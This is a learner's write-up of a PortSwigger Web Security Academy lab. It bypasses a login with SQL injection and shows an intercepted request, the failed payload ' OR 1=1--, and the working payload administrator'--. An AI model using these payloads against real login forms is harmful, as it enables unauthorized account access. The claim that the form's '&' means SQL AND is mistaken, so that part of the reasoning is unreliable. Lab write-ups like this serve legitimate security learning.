# SQL injection vulnerability allowing login bypass

**Source:** PortSwigger Web Security Academy
**Category:** SQL injection
**Date:** 2026-09

## The target

In front of us there is a shopping application which contains a SQL injection vulnerability, my job is to
find a way to enter the website as an administrator by performing a SQL injection attack.

## Reconnaissance

The first thing I do is going for the log in option, cause the name of the lab is login bypass, in here
the is room for typing an username and a password so I wrote some example credentials. Afer this try I was
welcome with an "Invalid username or password" quote and nothing happened.

In this execersise I used the "Burp Suite Community" tool, whick allows me to use a proxy to intercep the
request and scan the body of it. In the BURP I intercepted this message

```
POST /login HTTP/2
Host: 0aa5000003adb383825206700027007b.web-security-academy.net
Cookie: session=ID55zz2KICHT3m8G3UZrmHEEQC9TiT7C
Content-Length: 77
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-ES,es;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://0aa5000003adb383825206700027007b.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa5000003adb383825206700027007b.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=mZINrYEpE2Y7SoB7pYK44TDNnzwtq5LA&username=administrator&password=example
```
So here I could see the place I would work with "csrf=mZINrYEpE2Y7SoB7pYK44TDNnzwtq5LA&username=administrator&password=example" 

## What I tried that did not work

The first thing I did was to attack the request with a `' OR 1=1--` on the password, the reason I dit it was because 
I saw somewhere time ago and I used it without thinking, sadly it didnt worked, probably because I was attacking the wrong part of the query.

Other things I tried was to type random texts looking for another type of error, but it was always the same quote "Invalid username or password" which didn't helped.

## The breakthrough

After thinking fow a little while, I realize that I was doing an SQL Injection attack, whick means that I'm trying to acces an item, probably from a table called user where there are two fields, the username and the password.

Also, thanks to the BURP tool, I saw the caracter "&" which is known for meaning the same as AND. With all of this I thought that
maybe the SQL query would look something like

```sql
SELECT * FROM users WHERE username = 'smth' AND password = 'smth'
```

## Exploitation

I set the username to `administrator'--` and left any value in the password:

```http
POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=x
```

The query the server builds becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'x'
```

The `'` closes the username string, and `--` turns the rest of the line
(` AND password = 'x'`) into a comment, so the database ignores it. The query now
matches the administrator row on username alone, and I am logged in as
`administrator`.
